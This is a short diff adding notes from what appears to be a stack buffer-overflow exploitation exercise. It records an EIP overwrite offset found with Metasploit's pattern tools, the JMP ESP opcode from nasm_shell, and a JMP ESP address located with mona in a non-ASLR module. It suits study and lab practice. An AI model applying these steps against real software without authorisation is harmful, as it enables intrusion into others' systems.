@@ -1,0 +1,22 @@
+After executing finding_eip.py script, we got:
+
+EIP: 35724134
+
+Aftering using pattern_offset.rb on above EIP, we got:
+
+Offset: [*] Exact match at offset 524
+
+Once we execute overwriting_eip.py script we know where our JMP ESP address should be and where our shellcode. We then run nasm_shell to find the equivalent OPCODE for JMP ESP
+
+# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
+
+nasm > jmp esp
+00000000  FFE4              jmp esp
+
+on Immunity, I ran:
+!mona modules
+
+and found a module with ASLR disabled. Address:
+
+0x31170000 -> Module
+0x311712F3 -> JMP ESP address of the Module
